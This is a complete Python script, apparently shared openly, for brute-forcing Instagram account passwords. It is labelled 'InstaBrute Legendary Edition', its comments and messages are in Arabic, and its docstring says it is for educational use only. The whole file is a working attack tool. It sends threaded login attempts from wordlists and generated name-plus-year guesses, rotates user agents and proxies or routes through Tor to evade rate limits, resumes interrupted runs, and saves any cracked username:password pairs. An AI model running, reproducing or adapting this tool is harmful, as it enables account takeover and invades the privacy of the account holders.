#!/usr/bin/env python3
"""
InstaBrute Legendary Edition
كل ما تحتاجه في أداة واحدة – للاستخدام التعليمي فقط.
"""

import requests
import time
import threading
import argparse
import random
import sys
import os
import json
import re
from queue import Queue
from datetime import datetime
from collections import defaultdict
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False
    class Fore: RED=''; GREEN=''; YELLOW=''; CYAN=''; MAGENTA=''; RESET=''
    class Style: BRIGHT=''; RESET_ALL=''

# ==================== الإعدادات العامة ====================
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

LOGIN_URL = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
BASE_URL = "https://www.instagram.com/"
TIMEOUT = 15
MAX_RETRIES = 3
RETRY_BACKOFF = 2  # seconds multiplier

class InstaBruteLegendary:
    def __init__(self, username_file=None, username=None, password_file=None,
                 output="legendary_results.txt", threads=20, delay=0.5,
                 random_delay=True, proxy_file=None, use_tor=False,
                 user_agents=None, resume=False, generate_passwords=False,
                 min_year=1970, max_year=2010):
        self.username_file = username_file
        self.single_username = username
        self.password_file = password_file
        self.output_file = output
        self.threads = threads
        self.base_delay = delay
        self.random_delay = random_delay
        self.proxy_file = proxy_file
        self.use_tor = use_tor
        self.user_agents = user_agents or DEFAULT_USER_AGENTS
        self.resume = resume
        self.generate_passwords = generate_passwords
        self.min_year = min_year
        self.max_year = max_year

        self.queue = Queue()
        self.found = False
        self.lock = threading.Lock()
        self.results = []
        self.proxies = []
        self.sessions = defaultdict(dict)  # per thread session cache
        self.processed = set()
        self.total_attempts = 0
        self.success_count = 0

        # تحميل البروكسيات
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                for line in f:
                    p = line.strip()
                    if p:
                        self.proxies.append(p)
            print(f"{Fore.CYAN}[*] تم تحميل {len(self.proxies)} بروكسي{Style.RESET_ALL}")

        # تحميل نقاط التوقف إن وجدت
        if resume and os.path.exists(output):
            with open(output, 'r') as f:
                for line in f:
                    if 'نجاح' in line or 'فشل' in line:
                        # استخراج كلمة المرور من السطر
                        parts = line.split(':')
                        if len(parts) >= 3:
                            pwd = parts[2].strip()
                            self.processed.add(pwd)
            print(f"{Fore.YELLOW}[*] استئناف: تم تخطي {len(self.processed)} كلمة مرور سابقة{Style.RESET_ALL}")

    def get_proxy(self):
        if self.use_tor:
            return {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}
        if self.proxies:
            p = random.choice(self.proxies)
            return {'http': p, 'https': p}
        return None

    def get_user_agent(self):
        return random.choice(self.user_agents)

    def load_passwords(self):
        passwords = []
        if self.password_file and os.path.exists(self.password_file):
            with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    pwd = line.strip()
                    if pwd and pwd not in self.processed:
                        passwords.append(pwd)

        # توليد كلمات مرور إضافية حسب القواعد
        if self.generate_passwords:
            # توليد قائمة من الأسماء الشائعة مع سنوات
            common_names = ['admin', 'user', 'test', 'root', 'password', 'letmein', 'qwerty', '123456']
            for name in common_names:
                for year in range(self.min_year, self.max_year+1, 1):
                    pwd = f"{name}{year}"
                    if pwd not in passwords and pwd not in self.processed:
                        passwords.append(pwd)
            # توليد بناءً على اسم المستخدم (إذا كان مفرداً)
            if self.single_username:
                base = self.single_username
                for i in range(1, 10):
                    pwd = f"{base}{i}"
                    if pwd not in passwords and pwd not in self.processed:
                        passwords.append(pwd)
                # بإضافة سنة
                for year in range(self.min_year, self.max_year+1, 1):
                    pwd = f"{base}{year}"
                    if pwd not in passwords and pwd not in self.processed:
                        passwords.append(pwd)

        # خلط القائمة لتوزيع المحاولات
        random.shuffle(passwords)
        for pwd in passwords:
            self.queue.put(pwd)
        print(f"{Fore.CYAN}[*] تم تحميل {self.queue.qsize()} كلمة مرور جاهزة{Style.RESET_ALL}")

    def load_usernames(self):
        usernames = []
        if self.username_file and os.path.exists(self.username_file):
            with open(self.username_file, 'r') as f:
                for line in f:
                    u = line.strip()
                    if u:
                        usernames.append(u)
        elif self.single_username:
            usernames.append(self.single_username)
        return usernames

    def get_session(self, thread_id):
        if thread_id not in self.sessions:
            sess = requests.Session()
            sess.headers.update({'User-Agent': self.get_user_agent()})
            self.sessions[thread_id] = sess
        return self.sessions[thread_id]

    def get_csrf_token(self, thread_id):
        session = self.get_session(thread_id)
        try:
            resp = session.get(BASE_URL, proxies=self.get_proxy(), timeout=TIMEOUT)
            for cookie in session.cookies:
                if cookie.name == 'csrftoken':
                    return cookie.value
        except:
            pass
        # محاولة ثانية مع وكيل جديد
        session.headers.update({'User-Agent': self.get_user_agent()})
        try:
            resp = session.get(BASE_URL, proxies=self.get_proxy(), timeout=TIMEOUT)
            for cookie in session.cookies:
                if cookie.name == 'csrftoken':
                    return cookie.value
        except:
            pass
        return None

    def try_login(self, username, password, thread_id):
        if self.found:
            return

        csrf = self.get_csrf_token(thread_id)
        if not csrf:
            with self.lock:
                print(f"{Fore.YELLOW}[!] تعذر الحصول على CSRF لـ {password}{Style.RESET_ALL}")
            return False

        session = self.get_session(thread_id)
        session.headers.update({
            'User-Agent': self.get_user_agent(),
            'X-CSRFToken': csrf,
            'Referer': 'https://www.instagram.com/',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        session.cookies.set('csrftoken', csrf)

        data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }

        for attempt in range(MAX_RETRIES):
            try:
                resp = session.post(LOGIN_URL, data=data, proxies=self.get_proxy(), timeout=TIMEOUT)
                result = resp.json()
                if result.get('authenticated'):
                    with self.lock:
                        msg = f"{Fore.GREEN}{Style.BRIGHT}[✔] ✅ نجاح! {username}:{password}{Style.RESET_ALL}"
                        print(msg)
                        self.results.append(f"{datetime.now()} - SUCCESS - {username}:{password}")
                        self.found = True
                        self.success_count += 1
                    return True
                elif 'checkpoint_required' in str(result) or 'challenge' in str(result):
                    with self.lock:
                        msg = f"{Fore.YELLOW}[!] ⚠️ تحقق إضافي لـ {password}{Style.RESET_ALL}"
                        print(msg)
                        self.results.append(f"{datetime.now()} - CHALLENGE - {username}:{password}")
                    return False
                else:
                    with self.lock:
                        print(f"{Fore.RED}[-] ✖ فشل: {password}{Style.RESET_ALL}")
                        self.results.append(f"{datetime.now()} - FAIL - {username}:{password}")
                    return False
            except Exception as e:
                if attempt < MAX_RETRIES - 1:
                    wait = RETRY_BACKOFF ** attempt
                    with self.lock:
                        print(f"{Fore.YELLOW}[!] خطأ في المحاولة {attempt+1}، إعادة بعد {wait} ثانية...{Style.RESET_ALL}")
                    time.sleep(wait)
                    # تحديث الوكيل والـ User-Agent
                    session.headers.update({'User-Agent': self.get_user_agent()})
                else:
                    with self.lock:
                        print(f"{Fore.RED}[!] فشل بعد {MAX_RETRIES} محاولات لـ {password}: {e}{Style.RESET_ALL}")
                    self.results.append(f"{datetime.now()} - ERROR - {username}:{password} - {e}")
                    return False
        return False

    def worker(self, thread_id):
        while not self.queue.empty() and not self.found:
            try:
                pwd = self.queue.get(timeout=1)
            except:
                break
            # تنفيذ الهجوم على جميع المستخدمين (إذا كان هناك عدة)
            usernames = self.load_usernames()
            for user in usernames:
                if self.found:
                    break
                success = self.try_login(user, pwd, thread_id)
                if success:
                    self.found = True
                    break
            # تأخير
            if self.random_delay:
                delay = random.uniform(self.base_delay * 0.5, self.base_delay * 1.5)
            else:
                delay = self.base_delay
            time.sleep(delay)

    def save_results(self):
        if self.results:
            # كتابة النتائج في ملف
            with open(self.output_file, 'a') as f:
                for line in self.results:
                    f.write(line + '\n')
            print(f"{Fore.CYAN}[*] تم حفظ النتائج في {self.output_file}{Style.RESET_ALL}")

    def run(self):
        start_time = time.time()
        usernames = self.load_usernames()
        if not usernames:
            print(f"{Fore.RED}[!] لم يتم تحديد أي اسم مستخدم!{Style.RESET_ALL}")
            sys.exit(1)

        print(f"{Fore.MAGENTA}{Style.BRIGHT}⚡ InstaBrute Legendary Edition ⚡{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] المستخدمون: {', '.join(usernames)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] عدد الخيوط: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] التأخير الأساسي: {self.base_delay} ثانية{' (عشوائي)' if self.random_delay else ''}{Style.RESET_ALL}")
        if self.use_tor:
            print(f"{Fore.CYAN}[*] استخدام Tor (SOCKS5){Style.RESET_ALL}")
        if self.proxies:
            print(f"{Fore.CYAN}[*] عدد البروكسيات: {len(self.proxies)}{Style.RESET_ALL}")
        if self.user_agents:
            print(f"{Fore.CYAN}[*] عدد وكيل المستخدم: {len(self.user_agents)}{Style.RESET_ALL}")

        self.load_passwords()

        if self.queue.empty():
            print(f"{Fore.RED}[!] لا توجد كلمات مرور للاختبار!{Style.RESET_ALL}")
            sys.exit(1)

        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        elapsed = time.time() - start_time
        print(f"{Fore.CYAN}[*] انتهى الهجوم في {elapsed:.2f} ثانية{Style.RESET_ALL}")
        if self.success_count > 0:
            print(f"{Fore.GREEN}{Style.BRIGHT}[✔] تم العثور على {self.success_count} كلمة مرور صحيحة!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✘] لم يتم العثور على أي كلمة مرور صحيحة.{Style.RESET_ALL}")

        self.save_results()

def main():
    parser = argparse.ArgumentParser(description="InstaBrute Legendary Edition - أداة أسطورية")
    parser.add_argument("--username", help="اسم مستخدم واحد")
    parser.add_argument("--username-file", help="ملف يحتوي على قائمة مستخدمين (سطر لكل مستخدم)")
    parser.add_argument("--password-file", required=True, help="ملف كلمات المرور الأساسي")
    parser.add_argument("--output", default="legendary_results.txt", help="ملف النتائج")
    parser.add_argument("--threads", type=int, default=20, help="عدد الخيوط")
    parser.add_argument("--delay", type=float, default=0.5, help="التأخير بين المحاولات (ثانية)")
    parser.add_argument("--random-delay", action="store_true", default=True, help="تفعيل التأخير العشوائي")
    parser.add_argument("--proxy-file", help="ملف البروكسيات (سطر لكل بروكسي)")
    parser.add_argument("--tor", action="store_true", help="استخدام Tor")
    parser.add_argument("--user-agents", help="ملف يحتوي على وكيل مستخدم (سطر لكل وكيل)")
    parser.add_argument("--resume", action="store_true", help="استئناف من النتائج السابقة (تخطي الكلمات المختبرة)")
    parser.add_argument("--generate-passwords", action="store_true", help="توليد كلمات مرور إضافية (أسماء + سنوات)")
    parser.add_argument("--min-year", type=int, default=1970, help="أول سنة للتوليد")
    parser.add_argument("--max-year", type=int, default=2010, help="آخر سنة للتوليد")

    args = parser.parse_args()

    if not args.username and not args.username_file:
        print("Error: يجب تحديد --username أو --username-file")
        sys.exit(1)

    # تحميل وكيل المستخدم من ملف إن وجد
    user_agents = DEFAULT_USER_AGENTS.copy()
    if args.user_agents and os.path.exists(args.user_agents):
        with open(args.user_agents, 'r') as f:
            ua_list = [line.strip() for line in f if line.strip()]
            if ua_list:
                user_agents = ua_list

    brute = InstaBruteLegendary(
        username_file=args.username_file,
        username=args.username,
        password_file=args.password_file,
        output=args.output,
        threads=args.threads,
        delay=args.delay,
        random_delay=args.random_delay,
        proxy_file=args.proxy_file,
        use_tor=args.tor,
        user_agents=user_agents,
        resume=args.resume,
        generate_passwords=args.generate_passwords,
        min_year=args.min_year,
        max_year=args.max_year
    )

    brute.run()

if __name__ == "__main__":
    main()
